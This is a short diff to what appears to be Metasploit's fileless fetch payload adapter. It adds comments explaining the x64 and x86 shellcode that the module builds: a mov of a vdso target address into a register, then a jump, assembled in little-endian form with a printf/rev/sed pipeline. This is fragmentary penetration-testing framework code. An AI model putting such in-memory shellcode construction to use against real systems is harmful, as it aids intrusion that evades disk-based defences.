@@ -192,10 +192,15 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
     
     case arch
-    
+    # x64 shellcode
+    # mov rax, [target address]
+    # jmp rax
     when 'x64'
       %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     
+    # x86 shellcode
+    # mov eax, [target address]
+    # jmp eax
     when 'x86'
       %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     
